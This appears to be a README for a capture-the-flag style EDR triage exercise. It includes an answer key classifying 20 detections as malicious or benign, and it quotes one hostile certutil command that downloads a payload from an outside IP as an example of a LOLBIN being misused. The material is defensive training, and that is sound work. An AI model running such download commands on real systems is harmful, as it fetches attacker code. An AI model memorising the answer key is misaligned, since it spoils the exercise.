# WEEK 6 - EDR Telemetry Validation

## Quick Overview
Interactive challenge where 20 EDR detections must be classified as malicious (BLOCK) or benign (ALLOW).

## Challenge Result
✅ **100% Accuracy - All 20 flags captured**

---

## 📁 Files in This Directory

### Investigation Report
- **INVESTIGATION_REPORT.md** - Complete analysis with all 20 detections, reasoning, and flags

### Raw Data
- **edr_detections.json** - Complete EDR telemetry (606 lines, 20 detections)
- **detailed_reanalysis.json** - Full classification results with reasoning

### Analysis Scripts
- **extract_edr_simple.py** - Extracts detections from EDR server API
- **02_analyze_detections.py** - Initial classification logic
- **04_deep_reanalysis.py** - Deep verification analysis

---

## 🎯 Quick Answer Key

### 🔴 BLOCK (True Positive - Malicious): 1-10
1. ❌ BYOVD unsigned loader
2. ❌ DLL injection into notepad
3. ❌ Dropper staging payload
4. ❌ LSASS memory dump
5. ❌ Hookchain.exe injection
6. ❌ Certutil downloads payload
7. ❌ Regsvr32 remote scriptlet
8. ❌ Mshta remote HTA
9. ❌ Bitsadmin transfers binary
10. ❌ InstallUtil evil.dll

### 🟢 ALLOW (False Positive - Benign): 11-20
11. ✅ Backup agent
12. ✅ Driver update (signed)
13. ✅ ProcDump on IIS
14. ✅ MSBuild CI/CD
15. ✅ Remote admin patching
16. ✅ Certutil verify VPN cert
17. ✅ Regsvr32 vendor DLL
18. ✅ Mshta corporate enrollment
19. ✅ Rundll32 Control Panel
20. ✅ Bitsadmin Windows Update

---

## 🔑 Key Insights

### Severity is Misleading!
- Critical severity ≠ Always malicious
- Low severity ≠ Always benign

### Context Matters Most
Same tool (e.g., certutil) can be:
- ✅ **Benign**: `-verify myvpn.cer` (cert validation)
- ❌ **Malicious**: `-urlcache http://198.51.100.60/a.bin` (download payload)

### Process Relationships
- `msiexec.exe → regsvr32` = Software install (benign)
- `winword.exe → mshta` = Phishing (malicious)

---

## 📊 Statistics
- **True Positives**: 10/20 (50%)
- **False Positives**: 10/20 (50%)
- **Accuracy**: 100%
- **Flags Collected**: 20/20

---

## 🛠️ How to Use Scripts

### 1. Extract Detections
```bash
# Start EDR server first
.\iredrserver_windows_amd64.exe

# Extract data
python extract_edr_simple.py
```

### 2. Analyze Detections
```bash
python 02_analyze_detections.py
```

### 3. Deep Verification
```bash
python 04_deep_reanalysis.py
```

---

## 🎓 Skills Demonstrated
- EDR telemetry analysis
- Process behavior analysis
- LOLBIN identification
- Context-aware threat hunting
- False positive reduction
- MITRE ATT&CK mapping
- Python automation

---

**Challenge Status**: ✅ COMPLETE  
**Date**: November 9, 2025
